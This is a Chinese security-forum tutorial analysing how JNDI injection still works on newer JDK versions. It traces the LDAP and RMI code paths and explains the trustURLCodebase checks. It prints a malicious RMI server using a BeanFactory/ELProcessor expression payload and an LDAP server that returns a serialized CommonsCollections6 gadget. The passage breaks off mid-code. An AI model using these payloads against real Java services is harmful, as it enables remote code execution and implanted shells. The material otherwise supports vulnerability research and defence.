---
title: JDK高版本下的JNDI利用以及一些补充
url: https://forum.butian.net/share/3793
source: 奇安信攻防社区
date: 2024-10-01
fetch_date: 2025-10-06T18:49:02.477824
---

# JDK高版本下的JNDI利用以及一些补充

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### JDK高版本下的JNDI利用以及一些补充

* [渗透测试](https://forum.butian.net/topic/47)

某次行动的时候遇到了jolokia的JNDI注入利用，由于诸多原因需要更稳定的shell，所以考虑JNDI打入内存马，但是遇到了瓶颈。现在准备进一步学习，争取能够实现这个通过JNDI打入内存马的功能。

回顾高版本JNDI改动
===========
LDAP改动
------
调用栈如下：
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-b2ffd615b1e383735a1c81bfee8d1ee8012d5796.png)​
InitialContext到GenericURLContext的内容都是JNDI功能共有的，为了实现动态协议转化。之后的PartialCompositeContext以及ComponentContext是LDAP功能封装一些环境设置。重点还是DirectoryManager的getObjectInstance
首先先从缓存寻找之前是否有加载过的工厂构造类，如果没有的话就直接往下去寻找Reference中的ObjectFactory类
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-bc1caa47ab36a0ba613cab11349ebdf1b036af14.png)​
getObjectFactoryFromReference的内容首先第一段helper的调用loadClass进行类加载。本质上是在调用Class.forName,指定类加载器为AppClassLoader进行全类名的类加载。很明显这一段我们是加载不到Factory类的，所以还是往下根据codebase进行类加载。
```java
static ObjectFactory getObjectFactoryFromReference(
Reference ref, String factoryName)
throws IllegalAccessException,
InstantiationException,
MalformedURLException {
Class&lt;?&gt; clas = null;
// Try to use current class loader
try {
clas = helper.loadClass(factoryName);
} catch (ClassNotFoundException e) {
// ignore and continue
// e.printStackTrace();
}
// All other exceptions are passed up.
// Not in class path; try to use codebase
String codebase;
if (clas == null &amp;&amp;
(codebase = ref.getFactoryClassLocation()) != null) {
try {
clas = helper.loadClass(factoryName, codebase);
} catch (ClassNotFoundException e) {
}
}
return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```
这里的codebase实际上就是lookup中的去除协议和搜索类之后地址。factory的name是搜索类名。比如ldap://localhost:8085/shell​的话，那么codebase就是localhost:8085
继续跟进到helper的另一个传入了双形参的loadClass方法
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-fc4a753afd5c30d9ed3d4d7fb5ab0b8311b08970.png)​
然后我们比较一下8u191更新前的loadClass
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-a538a841f57383678f7a06e4fa69644537cb9c85.png)​
发现这里多了一个trustURLCodebase的判断，这也是高版本之后的对于远程codebase加载factory类的限制，默认是为false的，无法进行远程类加载。
那绕过点其实就在第一个helper.loadClass​中，也就是我们通过AppClassLoader去初始化本地工厂类--clas。最后return的时候是将该clas进行newInstance实例化之后再返回出去，作为参数赋值给factory，在检测了该factory不为空之后，调用它的getObjectInstance方法，之后的所有基于本地工厂类的攻击方式，都是依靠着这个getObjectInstance方法做文章
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-62b2dcabc0a08e702e45dea38e2965831e421f9d.png)​
RMI改动
-----
写一个RMI的恶意服务端
```java
package JNDI\_High;
import org.apache.naming.ResourceRef;
import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
public class Evil\_Reference {
public static void main(String[] args) throws Exception{
LocateRegistry.createRegistry(1099);
InitialContext initialContext=new InitialContext();
//Reference refObj=new Reference("evilref","evilref","http://localhost:8000/");
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
"(['calc']).start()\")"));
//initialContext.rebind("ldap://localhost:10389/cn=TestLdap,dc=example,dc=com",ref);
initialContext.rebind("rmi://localhost:1099/remoteobj",ref);
}
}
```
然后由客户端initialContext.lookup一下rmi://localhost:1099/remoteobj​即可
来看调用栈
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-d334d42f57d2068642a485d537702251980af0ca.png)​
重点改动还是在decodeObject里面，这里RMI又自己新增了一段trustURLCode的判断。不过这里倒不是最影响的，因为它的判断逻辑是!trustURLCode​，而trustURLCode默认为flase，所以当这条判断逻辑前面两个，也就是Reference对象不为空，且远程codebase的构造factory的地址也不为空的话，该if判断必过，抛出异常The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.​。这也是RMI在高版本JDK中JNDI注入限制点。
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-8bf5b2cdaf92af8fa9695c238e6450d631a942a8.png)​
当我们指定本地工厂进行加载，或者利用其它绕过方式，没有进入该if判断后，依然调用NamingManager的getObjectInstance方法。
所以说到底，RMI和Ldap各自高版本限制的区别在于：
- RMI的高版本限制在JNDI的SPI功能实现--NamingManager之前，提前将Reference对象中的远程factory判断住，抛出异常。
- Ldap的高版本限制在于最后SPI接口功能实现DirectoryManager,这里说是DirectoryManager只是为了好区分，落脚点还是在NamingManager​的getObjectFactoryFromReference​方法中，最后一步加载远程工厂类的时候给catch住了，if ("true".equalsIgnoreCase(trustURLCodebase))​判断条件过后才能远程类加载工厂类，不过trustURLCodebase被默认设置为了false
JDNI-ldap攻击面扩展部分
================
原理解析
----
主要是关于扩展LDAP的一段反序列化攻击。漏洞点在获取工厂类的前面部分，具体类和具体方法就是LdapCtx#c\\_lookup​,这其实并不难理解，不论是RMI还是LDAP，首先获取Reference对象的时候就是通过反序列化获取的，只不过RMI中也有一段decodeObject，那个是最终在解析工厂类了，而LDAP中则是在获取远程Reference对象
此时要想调用到Obj对象的decodeObject方法，就必须要满足这个条件：if (((Attributes)var4).get(Obj.JAVA\\_ATTRIBUTES\[2\]) != null)​，什么意思呢？这里的JAVA\\_ATTRIBUTES其实是一段属性值固定的字符串数组，结果为：static final String\[\] JAVA\\_ATTRIBUTES = new String\[\]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};​，然后var4是由var25得来，而var25是由指定远程地址获取到的LdapResult中所对应的LdapEntry，这个LdapEntry也就是之后也是我们需要构造的一个对象。根据后续的几个if条件，LdapResult的status属性值不能为0，其次该LdapResult中的LdapEntry只能有一个。之后的var4就是该entry所对应的键值。
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-7160a22b7c09ff3beddad2a1c4c581161bcd8c28.png)​
跟进decodeObject方法，这代码已经被反编译的不成人样了，但是我们依然能够找到关键方法deserialzeObject。Var0参数就是我们传入的反序列化数据，如果想要走到deserializeObject方法，就必须满足if ((var1 = var0.get(JAVA\\_ATTRIBUTES\[1\])) != null)​这段if判断，其实也就是从远程服务器中获取到的结果Entry中的javaSerializedData​键所对应的序列化值不能为空即可
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-634b89f274ff2837bb6889fa9f05adb2377b1bd3.png)​
继续跟进deserializeObject方法，注意此时的var0就是serializedObject的序列化数据的字节数组
这里经过ByteArrayInputStream封装之后，再经过一层ObjectInputStream的处理之后，调用readObject方法进行反序列化
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-f37c5b3ba9d5d65f384bfbf69afb347d8ef51421.png)​
具体构造利用
------
原理还是比较简单，就是看如何利用，其实就只有从头开始定位到恶意序列化数据如何传入的就行。总体是一个LdapResult，其中包含一个LdapEntry用来指定对应数据块。这个Entry里面至少包含两个键值对，一个是JavaClassName​键对应必须要有值，是啥无所谓。对应判断((Attributes)var4).get(Obj.JAVA\\_ATTRIBUTES\[2\]) != null​。第二个是JavaSerializedData​必须要有值，并且这里存放的就是我们恶意序列化链的数据。
对应的构造代码：
```java
import JNDI\_High.Server.Utils.CCEXP;
import JNDI\_High.Server.Utils.SerializeUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
public class OperationInterceptor extends InMemoryOperationInterceptor {
public String protocol;
public OperationInterceptor(String protocol){
this.protocol=protocol;
}
@Override
public void processSearchResult(InMemoryInterceptedSearchResult searchResult){
String base = searchResult.getRequest().getBaseDN();
Entry e = new Entry(base);
try{
e.addAttribute("javaClassName", "foo");
e.addAttribute("javaSerializedData", (byte[]) SerializeUtil.serialize(CCEXP.getPayloadCC6()));
System.out.println("[" + protocol + "] Sending serialized gadget");
searchResult.sendSearchEntry(e);
searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
} catch (Exception exception){
except...